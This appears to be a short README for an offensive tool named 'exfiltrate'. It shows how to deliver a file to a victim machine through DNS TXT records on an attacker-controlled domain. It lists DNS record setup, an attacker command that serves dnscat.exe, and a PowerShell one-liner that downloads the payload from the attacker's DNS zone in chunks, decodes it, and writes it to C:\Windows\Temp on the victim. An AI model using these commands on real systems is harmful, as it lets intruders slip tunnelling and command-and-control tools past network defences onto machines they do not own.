# exfiltrate

Correct `yourzone.tk`.

## General DNS Setup

```
A * -> <IP>
A @ -> <IP>
A vps -> <IP>
NS dns -> vps.yourzone.tk
```

## Infiltration (File Upload)

Attacker:

```bash
$ sudo ./dns_upload.py dns.yourzone.tk --udp --file dnscat.exe -o/--output 'C:\Windows\Temp\dnscat.exe' [-s/--sleep 300]
```

Victim:

```powershell
PS > for($d=1;$d -le 1190;$d++){while (1){try{$a=(Resolve-DnsName "d$d.dns.yourzone.tk" -Type TXT -Server 1.1.1.1 -ErrorAction Stop).Strings}catch{continue};break};$b=@();for($i=0;$i -le "$a".Length-1;$i=$i+2){$b+=[convert]::ToByte($a.Substring($i,2),16)};while(1){Sleep -mi 300;try{Add-Content "C:\Windows\Temp\dnscat.exe" -Value $b -Encoding Byte -ErrorAction Stop}catch{continue};break}}
```
